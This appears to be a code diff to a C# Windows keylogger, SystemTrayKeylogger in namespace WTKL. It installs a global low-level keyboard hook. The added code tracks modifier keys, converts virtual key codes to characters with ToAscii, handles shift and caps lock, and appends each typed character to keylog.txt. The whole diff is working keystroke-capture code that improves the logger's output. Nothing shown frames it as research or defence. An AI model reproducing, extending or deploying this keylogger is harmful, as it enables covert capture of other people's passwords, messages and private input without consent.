@@ -23,6 +23,25 @@ namespace WTKL
      */
     class SystemTrayKeylogger : Form, KeyloggerCommInterface
     {
+        private const byte VK_BACKSPACE = 8;
+        private const byte VK_TAB = 9;
+        private const byte VK_ENTER = 13;
+        private const byte VK_SHIFT = 16;
+        private const byte VK_CONTROL = 17;
+        private const byte VK_ALT = 18;
+        private const byte VK_CAPS = 20;
+        private const byte VK_ESC = 27;
+        private const byte VK_SPACE = 32;
+        private const byte VK_PAGEUP = 33;
+        private const byte VK_PAGEDOWN = 34;
+        private const byte VK_END = 35;
+        private const byte VK_HOME = 36;
+        private const byte VK_PRINTSCREEN = 44;
+        private const byte VK_INSERT = 45;
+        private const byte VK_DELETE = 46;
+        private const byte VK_LWINDOWS = 91;
+        private const byte VK_RWINDOWS = 92;
+        private const byte VK_NUMLOCK = 144;
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private const string TEXT_FILE_NAME = "keylog.txt";
@@ -31,6 +50,7 @@ namespace WTKL
         private static IntPtr _hookID = IntPtr.Zero;
         private static bool logging = false;
         private static StreamWriter textFileWriter;
+        private static byte[] keyStates = new byte[256];
         
         private NotifyIcon trayIcon;
         private ContextMenu trayMenu;
@@ -157,26 +177,89 @@ namespace WTKL
          * set equal to the HookCallback method. Whenever there is user input the _proc variable
          * is used to call the HookCallback function.
          */
-        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, ref keyboardHookStruct lParam);
+
+        public struct keyboardHookStruct
+        {
+            public int vkCode;
+            public int scanCode;
+            public int flags;
+            public int time;
+            public int dwExtraInfo;
+        }
+
+        private static void KeyStateHelper()
+        {
+            keyStates[VK_BACKSPACE] = ((GetKeyState(VK_BACKSPACE) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_TAB] = ((GetKeyState(VK_TAB) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_ENTER] = ((GetKeyState(VK_ENTER) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_SHIFT] = ((GetKeyState(VK_SHIFT) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_CONTROL] = ((GetKeyState(VK_CONTROL) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_ALT] = ((GetKeyState(VK_ALT) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_CAPS] = ((GetKeyState(VK_CAPS) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_ESC] = ((GetKeyState(VK_ESC) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_SPACE] = ((GetKeyState(VK_SPACE) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_PAGEUP] = ((GetKeyState(VK_PAGEUP) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_PAGEDOWN] = ((GetKeyState(VK_PAGEDOWN) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_END] = ((GetKeyState(VK_END) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_HOME] = ((GetKeyState(VK_HOME) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_PRINTSCREEN] = ((GetKeyState(VK_PRINTSCREEN) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_INSERT] = ((GetKeyState(VK_INSERT) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_DELETE] = ((GetKeyState(VK_DELETE) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_LWINDOWS] = ((GetKeyState(VK_LWINDOWS) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_RWINDOWS] = ((GetKeyState(VK_RWINDOWS) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_NUMLOCK] = ((GetKeyState(VK_NUMLOCK) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+        }
 
         /* HookCallback is where the actual reading of user inputs takes place in our application.
          * The method is called by the delegate above whenever there is user input detected by
          * the operating system.
          */
-        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, ref keyboardHookStruct lParam)
         {
             //todo figure out how to edit this keylogging code
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                //byte[] keyboardBuffer = new byte[256];
-                //GetKeyboardState(keyboardBuffer);
+                KeyStateHelper();
+                byte[] asciiConvertBuffer = new byte[2];
+                byte[] keyboardArray = new byte[256];
+                if(ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
+                {
+                    char key = (char)asciiConvertBuffer[0];
+                    if ((GetKeyState(VK_CONTROL) & 0x8000) == 0)
+                    {
+                        if (((GetKeyState(VK_SHIFT) & 0x8000) != 0 ^ (GetKeyState(VK_CAPS) & 0x0001) != 0)
+                            && Char.IsLetter(key))
+                        {
+                            //If shift XOR caps lock then capitalize here
+                            key = Char.ToUpper(key);
+                        }
+                        else
+                        {
+                            if (Char.IsLetter(key))
+                            {
+                                key = Char.ToLower(key);
+                            }
+                        }
+                        textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
+                        textFileWriter.Write(key);
+                        textFileWriter.Close();
+                    }
+                    else
+                    {
 
-                int vkCode = Marshal.ReadInt32(lParam);
-                textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
-                textFileWriter.Write((Keys)vkCode);
-                textFileWriter.Close();
+                    }
+                }
+                //int vkCode = Marshal.ReadInt32(lParam);
+                //char key = (char)vkCode;
+                
+                //int vkCode = Marshal.ReadInt32(lParam);
+                //textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
+                //textFileWriter.Write((Keys)vkCode);
+                //textFileWriter.Write(key);
+                //textFileWriter.Close();
             }
-            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+            return CallNextHookEx(_hookID, nCode, wParam, ref lParam);
         }
 
         /* This method is used to set our application's hook into the Windows keyboard
@@ -196,8 +279,11 @@ namespace WTKL
          **************************** DLL Import References ****************************
          *******************************************************************************/
         [DllImport("User32.dll", CharSet = CharSet.Auto)]
-        private static extern bool GetKeyboardState(byte[] lpKeyState);
+        private static extern int ToAscii(int keyCode, int scanCode, byte[] keyboardBuffer, byte[] translateBuffer, int flags);
         
+        [DllImport("User32.dll", CharSet = CharSet.Auto)]
+        private static extern short GetKeyState(int virtualKeyCode);
+
         [DllImport("User32.dll")]
         private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration
 
@@ -220,7 +306,7 @@ namespace WTKL
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-            IntPtr wParam, IntPtr lParam);
+            IntPtr wParam, ref keyboardHookStruct lParam);
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
